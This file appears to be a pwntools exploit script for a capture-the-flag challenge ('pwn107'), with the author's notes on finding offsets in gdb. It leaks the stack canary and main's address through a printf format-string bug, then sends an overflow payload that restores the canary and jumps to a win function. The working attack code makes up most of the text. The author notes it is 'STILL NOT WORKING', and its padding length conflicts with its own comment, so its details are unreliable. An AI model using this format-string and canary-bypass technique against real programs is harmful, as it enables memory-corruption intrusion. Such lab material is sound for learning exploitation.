

# canary resides at rbp-8 and is a QWORD
# retrnaddr resides at rbp+8
# rsp starts at rbp-40
# the win function is at get_streak at offset=x94c

#need to get the baseaddr
#need to leak during  execution

#The Vuln:
# xa36 is at main+164, a vuln printf
#put a breakpoint there and right after at main+169

#so the canary can be found w/ x/2w $rbp-8
#retrn address can be found w/ x/2w $rbp+8 (or x/2g)

#info fun and find an address in same as main...
#so i look for libc_csu_init which is at offset xa90
#0x~992  main
#0x~a90  __libc_csu_init
#on my local binary the stack is nulled so there are no references to other functions, so I have to go beyond the stack to find a func to leak - and main is the first one i come to.

#to find the canary location, using x/50g $rsp; we see the canary lies at memory address +7 from the start of the input, i.e. 0...7.  Also, we see the address for main at position 11.
#We can also find the canary by knowing that 0x40(rbp-40 is rsp address)-0x8(rbp-8 is canary address) = 56; then divide by 8 = 7.

#Determine the offset:
#Remember: for 64 bit linux; rdi, rsi, rdx, rcx,r8,r9, stack - though rdi is typically not prtinted first since it is the address of the input. So the first five values leaked will be rsi, rdx,rcx,r8,r9 before hitting the stack.  So we should have to leak five values before we get to our stack values. or skip the first five and start at 6...

#Entering "ABCD.%6$lx.%7$lx.%8$lx"  resulted in "ABCD.2436252e44434241.786c2437252e786c.%"  
#(remember read in this binary only reads 20 bytes so it should have stopped before finishing the eight position)

#so we see that ABCD was leaked into the 6th position (remember little endian).

#so we now know that the 6th position is our start point for entering values
#thus 6 + 7 (the difference between start and canary) is 13.  and main is 6+11, i.e. 17.

#to check run w/ ABCD.%13$lx.%17$lx

#ABCD.4cc7878e0793db00.562aee000992 <-values will change everytime but make sure the offset for the main value is correct, i.e x~992
# voila = the canary is the second value and the main address is the third.

from pwn import *

context.binary = binary = ELF("./pwn107.pwn107", checksec = False)
context.log_level = "debug"
staticMain = binary.symbols.main

print(hex(staticMain))  #should be ~992

p = process()
p.recvuntil(b"streak?")
payload = b"%13$lx.%17$lx"

p.sendline(payload)

p.recvuntil(b"streak:")
#p.recv()

output = p.recv().split(b"\n")[0]
print(output)

dynMain = int(output.split(b".")[1].strip(), 16)
canary = int(output.split(b".")[0].strip(), 16)

print(hex(dynMain))
print(hex(canary))

binary.address = dynMain - staticMain  #so this will determine the dynamic base address
print(hex(binary.address))

#so now we have to write 0x20-0x8=0x18 to overwrite the stack until the canary.  We have a second read at x~a18; this is convenient or we'd have to loop back to the main.  Anyway...

dynGetStreak = binary.symbols.get_streak	#this gives us our winaddr with x~94c
print(hex(dynGetStreak))
rop = ROP(binary)
retGadget = rop.find_gadget(['ret'])[0]

payload = b"A"*18		#overwrite stack up to canary
payload += p64(canary)	#overwrite canary with the correct value
payload += b"B"*8		#overwrite the $rbp
payload += p64(retGadget)	#helps alleviate stack alignment issues
payload += p64(dynGetStreak)	#overwrite the return value with the winaddr
p.sendline(payload)
p.interactive()

#STILL NOT WORKING - SHOULD JUST TRY THE STACK CANARY OVERWRITE WITH GDB ATTACHED
# gdb attach


